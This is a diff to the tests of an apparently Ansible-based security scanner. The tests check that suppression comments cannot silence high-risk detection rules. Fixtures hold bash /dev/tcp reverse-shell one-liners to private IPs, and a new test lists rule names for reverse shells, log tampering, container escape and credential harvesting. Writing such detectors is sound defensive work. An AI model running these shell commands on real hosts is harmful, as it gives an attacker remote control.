@@ -835,7 +835,7 @@ def test_ignore_silences_overlap_group_siblings_at_same_line(tmp_path):
 # in one place. These exercise the hardening rules in suppressions.py:
 #   - bare `# nosec` (no rule list) is REJECTED
 #   - missing `reason="..."` is REJECTED
-#   - UNSUPPRESSABLE_RULE_IDS cannot be silenced
+#   - unsuppressable rules cannot be silenced
 #   - suspicious_suppression meta-finding fires on high-risk content
 # The unit tests call the parser directly; the integration tests shell
 # out to the CLI against small tmp_path playbooks so the whole pipeline
@@ -906,7 +906,7 @@ def test_suppressions_unit_star_wildcard_is_valid():
     sup, warns = parse_suppressions(lines)
     assert sup[1].valid is True and warns == []
     assert match_suppression(sup, 1, "any_rule") is not None
-    assert match_suppression(sup, 1, "reverse_shell") is None  # unsuppressable
+    assert match_suppression(sup, 1, "bash_dev_tcp_reverse_shell") is None  # unsuppressable
 
 
 def test_suppressions_unit_unsuppressable_rule_cannot_be_silenced():
@@ -914,12 +914,52 @@ def test_suppressions_unit_unsuppressable_rule_cannot_be_silenced():
     from ansible_security_scanner.suppressions import match_suppression, parse_suppressions
 
     lines = [
-        'shell: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1  # nosec: reverse_shell reason="pentest"'
+        'shell: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1  # nosec: bash_dev_tcp_reverse_shell reason="pentest"'
     ]
     sup, warns = parse_suppressions(lines)
     assert sup[1].valid is False, "should have been rejected"
     assert any("cannot be suppressed" in w.reason for w in warns)
-    assert match_suppression(sup, 1, "reverse_shell") is None
+    assert match_suppression(sup, 1, "bash_dev_tcp_reverse_shell") is None
+
+
+def test_unsuppressable_set_covers_active_compromise_rules():
+    """Guard the derived unsuppressable set (patterns_manager builds it from
+    rule category/severity plus the ``unsuppressable: true`` flag). If a rule
+    is recategorised, downgraded, or renamed, it could silently become
+    suppressible again - this anchors the high-value active-compromise rules
+    so that regression fails loudly here instead of in production."""
+    from ansible_security_scanner.patterns_manager import unsuppressable_rule_ids
+
+    expected = {
+        # reverse shells
+        "bash_dev_tcp_reverse_shell",
+        "python_reverse_shell",
+        # anti-forensics / host tampering
+        "log_file_deletion",
+        "history_file_tampering",
+        "audit_log_tampering",
+        "firewall_disable",
+        # crypto mining + injection + container escape
+        "crypto_mining_binary",
+        "crypto_mining_pool",
+        "ld_preload_injection",
+        "nsenter_container_escape",
+        "docker_sock_abuse",
+        "sys_ptrace_capability_abuse",
+        # supply-chain compromise
+        "git_hook_or_config_write",
+        "xz_liblzma_backdoored_version_install",
+        # active data exfil (opted in via unsuppressable: true)
+        "credential_file_search",
+        "environment_variable_harvesting",
+        # scanner meta-rules
+        "suspicious_suppression",
+        "unknown_suppression_rule",
+        "excessive_suppressions",
+        "set_fact_secret_alias",
+    }
+    missing = expected - unsuppressable_rule_ids()
+    assert not missing, f"rules became suppressible: {sorted(missing)}"
 
 
 def test_suppressions_unit_regular_comments_are_not_directives():
@@ -1007,7 +1047,7 @@ def test_suppressions_integration_malicious_content_triggers_meta_finding(tmp_pa
 - hosts: all
   tasks:
     - name: nope
-      ansible.builtin.shell: "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"  # nosec: reverse_shell reason="pentest"
+      ansible.builtin.shell: "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"  # nosec: bash_dev_tcp_reverse_shell reason="pentest"
 """,
     )
     data = _report_as_json(_scan_playbook(playbook, show_suppressed=True))
